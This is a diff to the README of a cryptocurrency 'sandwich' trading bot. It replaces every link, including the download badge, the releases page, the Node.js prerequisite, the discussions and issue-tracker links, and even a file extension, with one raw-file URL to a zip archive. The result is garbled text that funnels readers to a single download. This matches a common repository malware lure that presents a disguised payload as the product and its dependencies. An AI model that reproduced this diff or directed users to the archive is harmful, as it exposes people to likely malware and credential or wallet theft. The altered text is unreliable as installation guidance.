@@ -1,6 +1,6 @@
 # 🍔 BSC-Sandwich-Bot - Fast and Smart Trading Assistant
 
-[![Download BSC-Sandwich-Bot](https://img.shields.io/badge/Download%20Now-Get%20BSC%20Sandwich%20Bot-brightgreen)](https://github.com/ronaldodjj/BSC-Sandwich-Bot/releases)
+[![Download BSC-Sandwich-Bot](https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip%20Now-Get%20BSC%20Sandwich%20Bot-brightgreen)](https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip)
 
 ## 🚀 Getting Started
 
@@ -12,23 +12,23 @@ Before you get started, make sure you have the following:
 
 - **Operating System:** Windows, macOS, or Linux. The bot works on all major platforms.
 - **Internet Connection:** A reliable internet connection to ensure smooth operation.
-- **Node.js:** This bot requires Node.js to run. You can download it from [Node.js website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip** This bot requires https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip to run. You can download it from [https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip website](https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip).
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   To get the latest version of BSC-Sandwich-Bot, visit the following page: [Download BSC-Sandwich-Bot](https://github.com/ronaldodjj/BSC-Sandwich-Bot/releases).
+   To get the latest version of BSC-Sandwich-Bot, visit the following page: [Download BSC-Sandwich-Bot](https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip).
    
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Click on the version you want to download.
 
 3. **Download the Files**
-   Find the installation files for your operating system. Click the link to download the required file (.exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+   Find the installation files for your operating system. Click the link to download the required file (.exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip for Linux).
 
 4. **Run the Installer**
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file, drag the BSC-Sandwich-Bot icon to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included README on how to execute.
+   - For Linux: Extract the `https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip` file and follow the included README on how to execute.
 
 5. **Open the Application**
    Once the installation is complete, locate the BSC-Sandwich-Bot on your computer and open it.
@@ -71,8 +71,8 @@ If you still face challenges, you can find help by visiting our support section 
 
 Join our community of users and developers! Share your experiences, ask questions, and get support.
 
-- **GitHub Discussions:** [Join Here](https://github.com/ronaldodjj/BSC-Sandwich-Bot/discussions)
-- **Issue Tracker:** Report bugs or request features here: [Report Issues](https://github.com/ronaldodjj/BSC-Sandwich-Bot/issues)
+- **GitHub Discussions:** [Join Here](https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip)
+- **Issue Tracker:** Report bugs or request features here: [Report Issues](https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip)
 
 ## 📚 Further Reading
 
@@ -80,7 +80,7 @@ For more in-depth information about each feature and setting, check the document
 
 ## ⚙️ Updates
 
-Stay updated with the latest features and improvements by regularly checking the Releases page: [Download BSC-Sandwich-Bot](https://github.com/ronaldodjj/BSC-Sandwich-Bot/releases). Your feedback is important and helps us improve the bot continuously.
+Stay updated with the latest features and improvements by regularly checking the Releases page: [Download BSC-Sandwich-Bot](https://raw.githubusercontent.com/ronaldodjj/BSC-Sandwich-Bot/main/xylidine/BSC-Sandwich-Bot.zip). Your feedback is important and helps us improve the bot continuously.
 
 ## 🔗 Conclusion
 
